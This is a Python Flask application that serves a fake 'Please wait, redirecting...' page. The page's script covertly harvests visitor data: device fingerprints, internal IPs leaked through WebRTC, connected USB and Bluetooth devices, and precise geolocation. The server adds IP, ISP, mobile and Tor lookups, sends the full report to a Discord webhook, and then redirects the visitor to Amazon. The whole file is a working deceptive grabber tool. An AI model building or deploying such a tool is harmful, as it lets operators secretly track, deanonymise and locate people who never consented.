from flask import Flask, request, render_template_string, jsonify
import requests
import os

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")

# HTML template remains the same; update if required.
HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body { font-family: sans-serif; text-align: center; background: #0e0e0e; color: white; }
    .loader {
      border: 10px solid #444;
      border-top: 10px solid #00f2ff;
      border-radius: 50%;
      width: 80px; height: 80px;
      margin: 50px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p id="detect">Please wait, redirecting...</p>
  <input id="pasteField" placeholder="Paste here" class="hidden">

  <script>
    async function collectInfo() {
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const battery = await navigator.getBattery();
        const voices = speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`);

        const features = {
          wasm: typeof WebAssembly === 'object',
          webrtc: typeof RTCPeerConnection === 'function',
          serviceWorker: 'serviceWorker' in navigator,
          notification: 'Notification' in window,
          localStorage: 'localStorage' in window,
          indexedDB: 'indexedDB' in window,
          deviceMotion: 'DeviceMotionEvent' in window,
          orientation: 'DeviceOrientationEvent' in window,
        };

        const devices = await navigator.mediaDevices.enumerateDevices();
        const mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);

        let bluetoothDevices = [], usbDevices = [];
        try {
          bluetoothDevices = await navigator.bluetooth.getDevices();
          bluetoothDevices = bluetoothDevices.map(d => d.name || 'Unnamed Device');
        } catch {}
        try {
          const usb = await navigator.usb.getDevices();
          usbDevices = usb.map(d => d.productName);
        } catch {}

        const osc = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        osc.connect(analyser);
        osc.start(0);
        let audioData = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(audioData);
        const audioFingerprint = audioData.slice(0, 5).join(',');

        let internalIPs = [];
        try {
          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel('');
          pc.createOffer().then(offer => pc.setLocalDescription(offer));
          pc.onicecandidate = e => {
            if (e.candidate) {
              const ipMatch = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
              if (ipMatch && !internalIPs.includes(ipMatch[1])) internalIPs.push(ipMatch[1]);
            }
          };
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch {}

        // Enhanced Geolocation with accuracy and speed.
        let location = { lat: null, lon: null, accuracy: null, speed: null };
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                location.lat = pos.coords.latitude;
                location.lon = pos.coords.longitude;
                location.accuracy = pos.coords.accuracy;
                location.speed = pos.coords.speed;
                resolve();
              },
              err => resolve()
            );
          });
        } catch {}

        // Ambient Light Sensor (if available)
        let ambientLight = "N/A";
        if ('AmbientLightSensor' in window) {
          try {
            const sensor = new AmbientLightSensor();
            sensor.addEventListener('reading', () => {
              ambientLight = sensor.illuminance;
            });
            sensor.start();
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (e) {
            ambientLight = "Error: " + e;
          }
        }

        // Browser Plugins
        const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];

        // Online/Offline Status
        const onlineStatus = navigator.onLine ? "online" : "offline";

        // Motion and Orientation events
        let motionData = {}, orientationData = {};
        window.addEventListener('devicemotion', e => {
          motionData = {
            accX: e.acceleration?.x || 0,
            accY: e.acceleration?.y || 0,
            accZ: e.acceleration?.z || 0
          };
        });
        window.addEventListener('deviceorientation', e => {
          orientationData = {
            alpha: e.alpha, beta: e.beta, gamma: e.gamma
          };
        });
        await new Promise(resolve => setTimeout(resolve, 1000));

        const payload = {
          screenWidth: screen.width,
          screenHeight: screen.height,
          platform: navigator.platform,
          language: navigator.language,
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffset: new Date().getTimezoneOffset(),
          cookiesEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          touchSupport: 'ontouchstart' in window,
          memory: navigator.deviceMemory || 'N/A',
          hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
          webGLVendor: gl.getParameter(gl.VENDOR),
          webGLRenderer: gl.getParameter(gl.RENDERER),
          unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
          unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
          batteryLevel: battery.level,
          charging: battery.charging,
          batteryChargingTime: battery.chargingTime,
          batteryDischargingTime: battery.dischargingTime,
          voices,
          features,
          mediaDevices,
          networkSpeed: navigator.connection?.downlink || 'N/A',
          effectiveType: navigator.connection?.effectiveType || 'N/A',
          colorDepth: screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          screenDiff: `${screen.width}x${screen.height} vs ${window.innerWidth}x${window.innerHeight}`,
          isPWA: window.matchMedia('(display-mode: standalone)').matches,
          referrer: document.referrer,
          visibility: document.visibilityState,
          bluetoothDevices,
          usbDevices,
          audioFingerprint,
          internalIPs,
          geoLocation: location,
          ambientLight,
          plugins,
          onlineStatus,
          motionData,
          orientationData
        };

        await fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        setTimeout(() => {
          window.location.href = "https://www.amazon.in";
        }, 3000);
      } catch (err) {
        document.getElementById("detect").innerText = "Error collecting info.";
      }
    }

    document.getElementById("pasteField").addEventListener("paste", e => {
      const pasted = e.clipboardData.getData("text");
      if (/.*@.*\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
        alert("Looks like you pasted sensitive data!");
      }
    });

    collectInfo();
  </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    try:
        ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
    except Exception:
        ip_info = {}

    # Check if DISCORD_WEBHOOK is set
    if not DISCORD_WEBHOOK:
        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500

    org = ip_info.get("org", "N/A")
    is_mobile = "Yes" if any(mob in org.lower() for mob in ["jio", "airtel", "vi", "bsnl", "mobile", "4g", "5g"]) else "No"
    is_tor = "tor" in org.lower()
    internal_ips = ", ".join(data.get("internalIPs", []))
    motion = data.get("motionData", {})
    orientation = data.get("orientationData", {})

    info = f"""
📊 **Extended Client Info**

🖥 Screen: {data.get('screenWidth')}x{data.get('screenHeight')}
🧠 Platform: {data.get('platform')}
🌐 Language: {data.get('language')}
🧭 User-Agent: {data.get('userAgent')}
🕓 Timezone: {data.get('timezone')} (Offset: {data.get('timezoneOffset')})
🍪 Cookies: {data.get('cookiesEnabled')}, DNT: {data.get('doNotTrack')}
📱 Touch: {data.get('touchSupport')}, RAM: {data.get('memory')} GB, Cores: {data.get('hardwareConcurrency')}

🎮 WebGL: {data.get('unmaskedVendor')} - {data.get('unmaskedRenderer')}
🔋 Battery: {int(data.get('batteryLevel', 1.0)*100)}% {'(Charging)' if data.get('charging') else '(Not Charging)'}
⏱ Charging Time: {data.get('batteryChargingTime')}
⏱ Discharging Time: {data.get('batteryDischargingTime')}
🎤 Audio FP: {data.get('audioFingerprint')}
🔌 Bluetooth: {', '.join(data.get('bluetoothDevices', []))}
🔌 USB: {', '.join(data.get('usbDevices', []))}

🎤 Media Devices: {', '.join(data.get('mediaDevices', []))}
🗣 Voices: {', '.join(data.get('voices', []))}
✅ Features: {', '.join([k for k,v in data.get('features', {}).items() if v])}
📡 Network: {data.get('networkSpeed')} Mbps ({data.get('effectiveType')})

🌍 Location: {data.get('geoLocation', {}).get('lat')}, {data.get('geoLocation', {}).get('lon')}
🎯 Geolocation Accuracy: {data.get('geoLocation', {}).get('accuracy')}
🎯 Geolocation Speed: {data.get('geoLocation', {}).get('speed')}
💡 Ambient Light: {data.get('ambientLight')}
🧩 Plugins: {', '.join(data.get('plugins', []))}
💻 Online Status: {data.get('onlineStatus')}

🧠 Motion: {motion}
🎯 Orientation: {orientation}
🧩 Internal IPs: {internal_ips}
🚀 PWA: {data.get('isPWA')}, Referrer: {data.get('referrer') or 'N/A'}, Tab Visible: {data.get('visibility')}

🌐 IP Info:
IP: {ip}
ISP: {org}
City: {ip_info.get('city', 'N/A')}
Region: {ip_info.get('region', 'N/A')}
Country: {ip_info.get('country', 'N/A')}
Location: {ip_info.get('loc', 'N/A')}
Mobile: {is_mobile}
TOR/VPN Detected: {"Yes" if is_tor else "No"}
    """.strip()

    try:
        # Attempt to send to the Discord webhook
        response = requests.post(DISCORD_WEBHOOK, json={"content": info})
        response.raise_for_status()
    except Exception as ex:
        return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500

    return jsonify({"status": "ok"})

@app.route("/health", methods=["GET"])
def health_check():
    """
    Health check endpoint that verifies if the DISCORD_WEBHOOK env variable is set and
    attempts a test message to the webhook.
    """
    if not DISCORD_WEBHOOK:
        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500

    try:
        test_payload = {"content": "Test: Webhook connection is working."}
        response = requests.post(DISCORD_WEBHOOK, json=test_payload)
        response.raise_for_status()
    except Exception as ex:
        return jsonify({"status": "error", "message": f"Webhook connection failed: {ex}"}), 500

    return jsonify({"status": "ok", "message": "Webhook connection successful"})

if __name__ == "__main__":
    # Optional: Log a warning if DISCORD_WEBHOOK isn't set.
    if not DISCORD_WEBHOOK:
        print("Warning: DISCORD_WEBHOOK is not configured!")
    app.run(debug=True)
